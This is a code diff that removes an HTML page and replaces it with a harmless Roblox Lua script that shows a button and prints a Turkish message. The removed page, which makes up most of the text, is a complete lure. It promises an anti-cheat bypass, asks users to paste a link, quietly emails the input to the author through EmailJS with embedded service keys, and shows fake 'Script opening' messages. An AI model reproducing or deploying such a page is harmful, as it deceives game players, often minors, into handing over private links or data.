@@ -1,88 +1,27 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Enter Ur Ps Link To Bypass-AntiCheat</title>
+-- Oyun tamamen yüklensin
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+end
 
-    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+-- GUI oluştur
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local Button = Instance.new("TextButton")
 
-    <style>
-        body {
-            background-color: black;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            font-family: Arial, sans-serif;
-        }
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
-        .box {
-            width: 800px;
-            height: 450px;
-            border: 4px solid #00ff00;
-            background-color: #111;
-            text-align: center;
-            padding-top: 80px;
-            box-shadow: 0 0 25px #00ff00;
-        }
+Frame.Parent = ScreenGui
+Frame.Size = UDim2.new(0, 300, 0, 200)
+Frame.Position = UDim2.new(0.5, -150, 0.5, -100)
+Frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
 
-        h1 {
-            color: #00ff00;
-            font-size: 28px;
-        }
+Button.Parent = Frame
+Button.Size = UDim2.new(0, 200, 0, 50)
+Button.Position = UDim2.new(0.5, -100, 0.5, -25)
+Button.Text = "Butona Bas"
+Button.BackgroundColor3 = Color3.fromRGB(0,170,0)
+Button.TextColor3 = Color3.new(1,1,1)
 
-        input {
-            margin-top: 40px;
-            width: 70%;
-            padding: 15px;
-            font-size: 18px;
-            background-color: black;
-            border: 2px solid #00ff00;
-            color: #00ff00;
-            outline: none;
-        }
-
-        button {
-            margin-top: 20px;
-            padding: 10px 25px;
-            background: black;
-            color: #00ff00;
-            border: 2px solid #00ff00;
-            cursor: pointer;
-        }
-    </style>
-</head>
-<body>
-
-<div class="box">
-    <h1>enter somethink to chat with me</h1>
-
-    <input type="text" id="mesaj" placeholder="Paste link here..." required>
-    <br>
-    <button onclick="gonder()">Send</button>
-
-</div>
-
-<script>
-    (function(){
-        emailjs.init("0qmYmoIOTH4NkUygT");
-    })();
-
-    function gonder() {
-        var mesaj = document.getElementById("mesaj").value;
-
-        var params = {
-            message: mesaj
-        };
-
-        emailjs.send("service_olk42gs", "template_hv7vl8k", params)
-        .then(function(response) {
-            alert("Script opening");
-        }, function(error) {
-            alert("Script Updating try later!");
-        });
-    }
-</script>
-
-</body>
-</html>
+Button.MouseButton1Click:Connect(function()
+    print("Butona basıldı!")
+end)
